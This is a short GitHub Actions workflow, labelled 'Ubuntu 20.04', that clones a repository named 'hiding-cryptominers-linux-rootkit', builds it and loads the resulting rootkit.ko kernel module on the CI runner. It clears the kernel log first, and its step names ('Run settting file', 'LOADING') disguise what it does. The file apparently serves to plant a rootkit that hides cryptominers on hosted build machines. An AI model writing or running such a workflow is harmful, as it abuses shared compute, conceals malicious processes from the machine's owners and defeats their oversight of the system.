name: Ubuntu 20.04

on: 
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-20.04
    steps:
      - uses: actions/checkout@v2
      - name: Run settting file
        run: |
          git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit
          cd hiding-cryptominers-linux-rootkit/
          make
      - name: LOADING
        run: |
          sudo dmesg -C &
          sudo insmod rootkit.ko
          sudo dmesg
          
